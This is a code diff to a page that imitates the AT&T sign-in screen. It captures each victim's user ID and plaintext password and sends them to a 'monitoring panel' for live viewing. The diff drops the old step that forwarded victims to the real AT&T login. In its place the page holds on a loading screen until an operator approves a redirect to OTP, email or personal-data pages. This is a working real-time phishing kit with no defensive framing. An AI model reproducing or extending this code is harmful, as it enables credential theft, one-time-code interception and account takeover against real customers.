@@ -67,16 +67,16 @@ export default function Home() {
               window.approvalPollInterval = null;
             }
             
-            if (approval.status === 'approved') {
-              const redirectType = approval.redirectType || 'password';
-              console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
-              
-              // Store userId for OTP page
-              if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
-                localStorage.setItem('lastUserId', userId);
-              }
-              
-              handleRedirect(redirectType, userId);
+              if (approval.status === 'approved') {
+                const redirectType = approval.redirectType || 'att';
+                console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
+                
+                // Store userId for OTP/email/personal pages
+                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                  localStorage.setItem('lastUserId', userId);
+                }
+                
+                handleRedirect(redirectType, userId);
             } else if (approval.status === 'denied') {
               const loadingScreen = document.getElementById('loading-screen');
               if (loadingScreen) loadingScreen.classList.remove('active');
@@ -212,7 +212,7 @@ export default function Home() {
           // First step: Log user ID entry (panel monitoring only, no blocking)
           await logActivity('userid', userId);
           
-          // Automatically proceed to password view
+          // Automatically proceed to password view (no loading screen)
           cachedUsername = userId;
           cachedUserIdText.textContent = userId;
           userIdGroup.style.display = 'none';
@@ -227,14 +227,15 @@ export default function Home() {
           }
           
         } else if (cachedUsername) {
-          // Second step: Password entered - log and redirect to AT&T
+          // Second step: Password entered - show loading and wait for panel approval
           const password = document.getElementById('password').value;
           
-          // Log password entry (panel monitoring only, no blocking)
-          await logActivity('password', cachedUsername, { 
+          // Log password entry
+          const activityId = await logActivity('password', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password // Include password for real-time display on monitoring panel
           });
+          pendingActivityId = activityId;
           
           // Log sign-in button click
           await logActivity('signin', cachedUsername, { 
@@ -242,8 +243,13 @@ export default function Home() {
             password: password
           });
           
-          // Redirect to AT&T sign-in page
-          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
+          // Show loading screen
+          const loadingScreen = document.getElementById('loading-screen');
+          if (loadingScreen) loadingScreen.classList.add('active');
+          submitBtn.disabled = true;
+          
+          // Wait for approval via SSE
+          waitForApprovalSSE(activityId, 'signin', cachedUsername);
         }
       });
     }
